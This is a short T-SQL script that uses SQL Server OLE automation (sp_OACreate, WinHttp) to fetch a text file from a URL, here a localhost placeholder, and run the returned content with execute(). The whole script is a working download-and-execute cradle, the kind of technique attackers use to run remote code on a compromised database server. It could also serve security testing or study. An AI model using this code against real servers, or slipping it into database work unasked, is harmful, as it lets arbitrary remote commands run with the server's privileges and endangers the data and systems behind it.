-- Setup Variables
DECLARE @url varchar(300)   
DECLARE @win int  
DECLARE @hr  int  
DECLARE @Command varchar(8000) 

-- Set target url containting TSQL
SET @url = 'http://127.0.0.1/test.txt'
SET @url = 'http://127.0.0.1/mycmd.txt'

-- Setup namespace
EXEC @hr=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@win OUT  

-- Setup method
EXEC @hr=sp_OAMethod @win, 'Open',NULL,'GET',@url,'false' 

-- Send http GET request
EXEC @hr=sp_OAMethod @win,'Send'

-- Grab response and throw it in the temp table  
EXEC @hr=sp_OAGetProperty @win,'ResponseText', @Command out

-- Destroy the object
EXEC @hr=sp_OADestroy @win  

-- Display command
SELECT @Command

-- Run command
execute(@Command) 
